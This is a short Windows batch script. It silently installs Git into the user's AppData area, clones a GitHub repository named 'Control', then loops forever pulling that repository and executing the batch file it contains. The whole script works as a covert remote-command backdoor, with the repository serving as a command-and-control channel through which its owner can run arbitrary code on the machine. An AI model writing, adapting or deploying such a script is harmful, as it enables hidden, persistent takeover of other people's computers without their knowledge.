cd C:\users\%username%\AppData
git version >git.sav
>nul find "version" git.sav && (
  goto nxt
) || (
  goto GIT_download
)
:nxt
if not exist Control (git clone https://github.com/Guest257351/Control)
cd Control
:begin
git pull
timeout 1 /NOBREAK >nul
call REPtxt.bat
timeout 10 /NOBREAK >nul
goto begin
:offline
del cmd.bat
timeout 10 /NOBREAK >nul
goto begin
:GIT_download
powershell Import-Module BitsTransfer
powershell Start-BitsTransfer -source "https://github.com/git-for-windows/git/releases/download/v2.31.0.windows.1/Git-2.31.0-64-bit.exe" -Destination gitDL.exe
timeout 1 /NOBREAK >nul
gitDL.exe /verysilent
del gitDL.exe
timeout 10 /NOBREAK >nul
goto begin